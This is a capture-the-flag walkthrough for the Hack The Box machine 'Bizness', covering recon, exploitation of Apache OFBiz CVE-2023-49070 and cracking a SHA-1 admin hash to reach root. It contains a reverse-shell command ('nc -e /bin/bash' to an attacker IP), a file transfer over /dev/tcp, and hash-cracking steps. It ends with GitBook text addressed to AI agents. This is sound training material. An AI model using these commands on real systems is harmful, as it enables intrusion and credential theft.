---
title: "Bizness"
difficulty: Easy
---

# Bizness

🔗 [Bizness](https://www.hackthebox.com/machines/bizness)

<details>

<summary>About</summary>

### Machine Description

Bizness is an easy Linux box centered on a pre-authentication remote code execution (RCE) flaw in Apache OFBiz, tracked as `[CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070)`. We abuse that bug to land a shell, then digging through the OFBiz configuration surfaces a hashed password stored in the service's Derby database. With a bit of research and code review, that hash is reshaped into a more standard form that common tools can crack. The recovered password then lets us log in as root.

### Area of Interest

Web ApplicationDatabasesCommon Applications

### Technology

NGINXApache OFBiz

### Vulnerabilities

Weak CredentialsRemote Code ExecutionMisconfigurationInsecure Design

### Security Tools

NetcathashcatNmap

### Languages

PythonJava

### Techniques

ReconnaissanceWeb Site Structure DiscoveryConfiguration AnalysisPassword ReusePassword Cracking

### CVE

CVE-2023-49070

</details>

## Task 0 - Deploy machine

🎯 Target IP: `<YOUR_IP>`

On the Desktop, make a folder named after the machine, and inside it a second folder to hold the files and outputs the box requires, including the nmap scans.

Once that's set up, bring up the VPN so we can reach the lab: `openvpn htb_vpn.ovpn`

## Task 1 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "<YOUR_IP> bizness.htb" >> /etc/hosts
</strong>
mkdir -p htb/bizness.htb
cd htb/bizness.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I like to kick off recon with a ping to the target, which confirms connectivity and gives us a hint about the OS.

```bash
ping -c 3 bizness.htb
PING bizness.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from bizness.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=50.8 ms
64 bytes from bizness.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=56.0 ms
64 bytes from bizness.htb (<YOUR_IP>): icmp_seq=3 ttl=63 time=53.3 ms
```

From these three ICMP replies, the Time To Live (TTL) is around 64, which points to a **\*nix** host; Windows machines typically report a TTL near 128.

### 1.1 - How many TCP ports are listening on Bizness?

Let's jump straight into an active port scan with nmap

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv bizness.htb -oN nmap/tcp_port_scan
```

```bash
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
443/tcp   open  https   syn-ack ttl 63
45853/tcp open  unknown syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>

The scan turns up 4 open TCP ports: 22,80,443,45853.

4

Next, we enumerate the services running on those open ports:

```bash
sudo nmap -sV -sC -p 22,80,443,45853 bizness.htb -oN nmap/service_port_scan
```

```bash
ORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_ssl-date: TLS randomness does not represent time
45853/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 1.2 - What Enterprise Resource Planning (ERP) backend is in use?

The web servers run nginx 1.18; we can verify this and pull additional details with the `whatweb bizness.htb` command:

```bash
http://bizness.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[<YOUR_IP>], RedirectLocation[https://bizness.htb/], Title[301 Moved Permanently], nginx[1.18.0]
https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[<YOUR_IP>], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
```

Then open the web server in a browser:

Running directory enumeration with the Dirb tool and reviewing the page source doesn't reveal anything else useful.

```bash
dirb https://bizness.htb 
```

We do find an interesting page hosting a login form along with the ERP version:

<https://bizness.htb/accounting/control/main>

apache ofbiz

### 1.3 - What version of OFBiz is running on the target system?

\
The OFBiz version is already visible in the previous screen:

18.12

## Task 2 - Exploitation & User Flag

### 2.1 - What is the 2023 CVE ID for a pre-authentication, remote code execution vulnerability on this version of OFBiz?

With searchsploit we can quickly turn up an exploit for this version of Apache OFBiz

search it on google to review possible alternatives and find the matching CVE ID

that CVE is from 2024, so we need a 2023 one instead, so google: "ofbiz 18.12 CVE 2023"&#x20;

and we land on a 2023 CVE on the nist site:&#x20;

<https://nvd.nist.gov/vuln/detail/cve-2023-49070>

Pre-auth RCE in Apache Ofbiz 18.12.09, stemming from the deprecated XML-RPC component still being present. This issue affects Apache OFBiz: before 18.12.10. Users are recommended to upgrade to version 18.12.10

CVE-2023-49070

### 2.2 - What user is the OFBiz service running as?

A PoC for exploiting it lives on github: <https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass> and it bundles everything we need: the PoC plus the ysoserial-all.jar tool

Always be careful what you download, open source / github does not mean 100% harmless program

Download files locally using git clone command:

```bash
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
```

check our attacker box machine IP using `ifconfig tun0` go in listening mode using netcat `nc -lvnp 1339` and into another shell, go run our exploit spawning a /bin/bash shell

```bash
python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.17.177 1339'
```

```
ofbiz
```

### 2.3 - Submit the flag located in the ofbiz user's home directory.

Move to the user's home directory with cd \~ and cat the user flag

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

f17c************************c401

</details>

## Task 3 - Privilege Escalation & Root Flag

### 3.1 - What is the full path of the directory that OFBiz is installed in?

We can locate it under the /opt directory

/opt/ofbiz

### 3.2 - What hashing algorithm is the OFBiz installation configured to use for passwords?

To upgrade our shell into an interactive, more workable one run this command: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

then start hunting through the configuration files for the hashing algorithm in use.

there's a relevant file at the path: /opt/ofbiz/framework/security/config that holds the answer:

SHA

### 3.3 - What database is used by Apache OFBiz, by default?

Look for the directory tied to the database among the data-related folders.

We found an interesting file at the path: `/opt/ofbiz/runtime/data/derby/derby.log` which holds the db logs along with the corresponding db name and its version

Apache Derby

### 3.4 - In which directory are the Derby-related files stored on Bizness?

Browsing the folders, there's an interesting  file at path: /opt/ofbiz/runtime/data/derby/ofbiz/seg0 with more .dat files

Search them for an 'admin' string with this command: `grep -a -l 'admin.$' *.dat` to narrow down to the files likely holding sensitive administrative strings

and inside a file called: c6650.dat we found this value: `admin$"$SHA$$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

/opt/ofbiz/runtime/data/derby

### 3.5 - Using derby-tools and the `ij` command-line utility, what is the command within `ij` to connect to a database stored in `./ofbiz`?

Honestly, I may have already jumped ahead with the previous question.

The ij utility doesn't appear to be present on this machine, so we'll copy the .dat files over and install the ij utility on our kali attacker machine instead.

* Archive file using: `tar cvf /dev/shm/derby.tar derby`
* Transfer derby files to attacker machine:&#x20;
  * Go in listening mode on attacker machine: `nc -lvnp 4433 > derby.tar`
  * Send file via netcat: `cat /dev/shm/derby.tar > /dev/tcp/10.10.17.177/4433`

Now that the db is on the attacker machine, extract the archive with: `tar -xvf derby.tar`

and we can install ij to connect to the db:

```bash
sudo apt-install derby-tools
ij
protocol 'jdbc:derby';
connect 'jdbc:derby:./ofbiz;create=true'; 
show tables;
```

In my case I had to tack on an extra 'true' flag to get the connection to open properly.

connect 'jdbc:derby:./ofbiz';

### 3.6 - Which table contains the SHA-1 hash of the `admin` user?

Querying the db reveals the table holding the admin user's SHA-1 hash:

```sql
select * from OFBIZ.USER_LOGIN;
describe OFBIZ.USER_LOGIN;
select USER_LOGIN_ID,CURRENT_PASSWORD FROM OFBIZ.USER_LOGIN;
```

Which is, of course, the same one we already know: `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

```
USER_LOGIN
```

### 3.7 - What is the hex version of the discovered hash?

We know the password hash: `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` follows a SHA1-based format

* `$SHA$`: This indicates the use of the SHA-1 hashing algorithm.
* `d`: This is the salt used in the hashing process.
* `uP0_QaVBpDWFeo8-dRzDqRwXQ2I`: This is the Base64 URL-encoded hash. After decoding, this represents the actual hash value.

Decoding the Base64 URL-encoded String

```bash
echo "uP0_QaVBpDWFeo8-dRzDqRwXQ2I" | base64 -d | xxd -p > hash.txt
```

* `base64 -d`: This decodes the Base64 URL-encoded string.
* `xxd -p`: This converts the decoded bytes into a plain hexadecimal format. We need the hexadecimal version of the hash to use it in hashcat.

This generates a file hash.txt containing the decoded hash in hexadecimal format.

At this point, we have the decoded hash and we know the salt (`d`). However, hashcat expects the input hash to be in the format: `<hash>:<salt>`

```bash
echo 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' > hash.txt
```

```
b8fd3f41a541a435857a8f3e751cc3a91c174362
```

### 3.7 - What is the root user's password?

\
Now we can move on to cracking the hash with hashcat, passing -m 120 since that maps to the hashing algorithm `sha1($salt.$pass)`

```bash
hashcat -m 120 hash.txt /usr/share/wordlists/rockyou.txt
```

recovering our password in cleartext: `b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness`

monkeybizness

### 3.8 - Submit the flag located in the root user's home directory.

Finally, armed with the admin password, we can switch to root with the sudo command: `su -`

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

751f************************f9b7

</details>

---

# Agent Instructions
This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.

## Querying This Documentation
If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.

Perform an HTTP GET request on the current page URL with the `ask` query parameter:

```
GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/bizness.md?ask=<question>
```

The question should be specific, self-contained, and written in natural language.
The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.

Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
